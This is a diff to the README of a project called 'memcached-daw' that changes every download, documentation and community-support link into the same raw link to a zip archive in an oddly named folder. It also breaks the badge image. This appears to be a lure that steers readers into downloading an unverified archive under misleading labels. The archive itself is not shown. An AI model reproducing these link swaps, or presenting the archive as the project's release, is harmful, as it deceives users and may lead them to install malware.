@@ -1,6 +1,6 @@
 # 🚀 memcached-daw - Fast Caching Solution for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/fagirii/memcached-daw/releases)
+[![Download Now](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these simple instructions to get started with **memcached-daw**. In just 
 
 1. **Visit the Release Page**
 
-   To get the latest version of **memcached-daw**, visit the following link: [Download Here](https://github.com/fagirii/memcached-daw/releases).
+   To get the latest version of **memcached-daw**, visit the following link: [Download Here](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip).
 
 2. **Select the Latest Version**
 
@@ -76,9 +76,9 @@ If you encounter any issues while using **memcached-daw**, consider the followin
 
 ## 🔗 Helpful Links
 
-- [Download Here](https://github.com/fagirii/memcached-daw/releases)
-- [Documentation](https://github.com/fagirii/memcached-daw/wiki)
-- [Community Support](https://github.com/fagirii/memcached-daw/discussions)
+- [Download Here](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip)
+- [Documentation](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip)
+- [Community Support](https://raw.githubusercontent.com/fagirii/memcached-daw/main/neurogenous/memcached-daw.zip)
 
 ## 🛠️ Contributing
 
